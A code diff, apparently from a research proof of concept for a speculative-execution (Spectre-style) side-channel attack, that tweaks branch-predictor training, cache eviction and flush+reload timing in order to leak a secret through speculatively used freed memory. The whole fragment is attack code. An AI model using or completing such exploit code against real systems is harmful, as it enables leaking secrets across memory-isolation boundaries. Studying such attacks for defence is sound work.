@@ -66,7 +66,8 @@ void victim_func(int free_index, int secret_index) {
     int* k_dupe = malloc(MALLOC_SIZE);
     *k_dupe = secret_index;
 
-    printf("    \n");   //WHY DOES THIS IMPROVE ACCURACY?
+    //increase branch history for better accuracy
+    for(int i = 0; i < 100; i++) {if(i%2==0) {volatile int x = 0;} else {volatile int x = 1;}}
 
     //Remove freed[k_idx] from cache, so that the branch will speculatively execute.
     cpuid();
@@ -81,7 +82,7 @@ void victim_func(int free_index, int secret_index) {
     cpuid();
 
     //Optional debug print and freeing of allocated memory.
-    if(DBG && free_index==0) printf("k: %p (%d)\toverwrite_addr:%p (%d)\tnew val k: %d\n", k, *k, k_dupe, *k_dupe, *k);
+    //if(DBG && free_index==0) printf("k: %p (%d)\toverwrite_addr:%p (%d)\tnew val k: %d\n", k, *k, k_dupe, *k_dupe, *k);
     if(!freed[0]) free(k);
     if(!freed[1]) free(l);
     if(!freed[2]) free(m);
@@ -94,7 +95,7 @@ int* prepare(int secret_index) {
     flush_arr((void*)flush_reload_arr, N_PAGES);
 
     //access decisions in array, repeated out-of-bounds not traceable for branch predictor
-    int n_accesses = N_TRAINING +1;//-(rand() % (N_TRAINING/2)) + 1;
+    int n_accesses = N_TRAINING -(rand() % (N_TRAINING/2)) + 1;
     char free_indices[n_accesses];
     char secret_indices[n_accesses];
     for(int i = 0; i < n_accesses; i++) {
@@ -133,7 +134,7 @@ int main(int argc, char** argv) {
         printf("\nREPETITION %d\n", r);
         for (int s = 0; s < SECRET_SIZE; s++) {
             results[r][s] = prepare(s);
-            __sync_synchronize();
+            cpuid();
         }
     }
 
